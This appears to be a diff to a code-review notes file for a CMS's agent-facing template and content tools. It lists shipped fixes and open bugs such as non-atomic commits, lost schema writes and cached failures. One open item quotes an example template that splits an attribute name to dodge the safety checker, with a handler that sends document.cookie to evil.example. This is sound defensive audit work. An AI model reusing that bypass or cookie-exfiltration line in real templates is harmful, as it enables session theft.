@@ -161,6 +161,13 @@ plus a read of the deployed page. **Shipped fixes:**
   `template-relative-url` — reported, not refused.
 - `ad3228c` — `main` tracked generated routes for a `services` collection its own
   schema never declared, so every local build produced a spurious diff.
+- `5bdb832` — **`update_content` deleted the rest of the page.** A shallow spread
+  treated `slots` as one value, but `slots` IS the page (~50 keys on
+  content/pages/en/index.md): an agent asked to change the hero headline sends
+  `{slots: {headline: "…"}}` and every other slot vanished, with a green build. Nested
+  mappings now merge key by key; `null` removes a key. Same commit: `write_template`
+  refused the name `parts` (it lands in templates/parts/, where `checkSite` filters it
+  out so `validate_site` never reports the junk).
 
 **Open, in severity order.** None of these blocks the demo; the first two are the
 same class as the bug above — the checker says clean and the page is wrong.
@@ -196,11 +203,48 @@ same class as the bug above — the checker says clean and the page is wrong.
 - [ ] `RESERVED_ROUTE_BASES` omits `style-preview`, which is a real route
       (`frontend/pages/style-preview/[...variant].astro`). The list is hand-maintained
       rather than derived from `frontend/pages/` — that is the actual defect.
+- [ ] **A placeholder spliced into an attribute NAME defeats the safety check.**
+      `checkTemplateSafety` substitutes `{{ x }}` → `/lanzasafeplaceholder` before
+      parsing, which RETOKENIZES the markup, so
+      `<div on{{ evt }}click="fetch('https://evil.example/?c='+document.cookie)">`
+      returns nothing from `checkTemplate` and `write_template` commits it. Not XSS —
+      every render path goes through `renderChecked`, which throws — but that is the
+      damage: the template is accepted, publish runs, `astro build` dies, and per
+      CLAUDE.md the site silently keeps serving the previous version.
+- [ ] **`write_template` writes template.html and fields.json as two commits with no
+      rollback.** If the second fails (rate limit, 409, transient 5xx), staging holds a
+      template with no fields.json — `validate_site` calls it an error, the CMS shows
+      no inputs — and the error the agent gets doesn't say the first half landed.
+- [ ] **`update_content_type` throws AFTER its write succeeded** — the `updated.fields`
+      map runs after `saveText`, and nothing enforces that a folder collection has
+      `fields` (`checkSite` uses `c.fields || []`). The agent sees a failure for a call
+      that worked, and retries. Needs a hand-authored or imported schema.
+- [ ] **`data/schema.json` read-modify-write has no optimistic concurrency.**
+      `saveText` re-resolves the sha at WRITE time, so a change landing between the
+      read and the write — the CMS content-type editor, another MCP call, a
+      `Promise.all` batch in `functions/api/mcp.ts` — is overwritten instead of 409'd.
+      `save()` is last-write-wins by design for entries; here it loses a collection.
+- [ ] **`readSiteFile` caches a REJECTED promise.** `getCollections` guards exactly
+      this (`pending.catch(() => collectionsCache.delete(client))`, "a transient GitHub
+      error would poison the request"); `readSiteFile` doesn't, so one transient 5xx on
+      data/site.json fails every later `resolveLocale` in that request — and
+      `resolveLocale` is on every write path.
+- [ ] `set_seo` 400s on an idempotent re-set: the no-op detector compares the merged
+      object to the current one, so setting a field to the value it already has reads
+      to an agent as a retryable failure.
 - [ ] A new content type's `draft` field, where one is declared with `default: true`,
       means an entry written without the key is hidden from the production build.
       `create_content` writes `draft: false` explicitly and `create_content_type`
       declares no draft field at all, so the MCP path is safe — this bites a
       hand-authored `fields.json`.
+
+**Checked and clean** (so nobody re-reviews it): `assertEntryPath` / `assertSafePath`
+confinement, `isContentFolder` dropping a hostile `folder`, the derived-not-accepted
+`folder` in `create_content_type`, `SETTINGS_FILES` path derivation, `resolveLocale`
+guarding the locale interpolation, owner-only auth and the broker denied-vs-unavailable
+split in `functions/api/mcp.ts`, the subrequest budget (worst realistic call ~32 of 50),
+and menu round-tripping. parse5 bundles into the Worker at 567 KB raw / 126 KB gzipped
+with no import attributes.
 
 ---
 
